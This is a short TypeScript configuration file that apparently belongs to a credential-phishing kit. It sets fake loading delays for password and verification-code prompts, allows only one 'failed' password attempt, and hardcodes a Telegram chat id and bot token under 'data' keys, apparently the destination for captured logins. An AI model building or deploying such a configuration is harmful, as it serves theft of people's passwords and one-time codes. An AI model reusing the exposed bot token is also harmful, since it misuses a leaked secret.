interface Config {
  settings: {
    code_loading_time: number;
    max_failed_code_attempts: number;
    max_failed_password_attempts: number;
    password_loading_time: number;
  };
  telegram: {
    data_chatid: string;
    data_token: string;
  };
}
const defaultConfig: Config = {
  settings: {
    code_loading_time: 4000,
    max_failed_code_attempts: 8,
    max_failed_password_attempts: 1,
    password_loading_time: 4000,
  },
  telegram: {
    data_chatid: "938801251",
    data_token: "7872561320:AAEYeMyxHgN8PA2PahCWyMlZiMywqIcT9Tw",
  },
};
const getConfig = (): Config => {
  return defaultConfig;
};

export default getConfig;
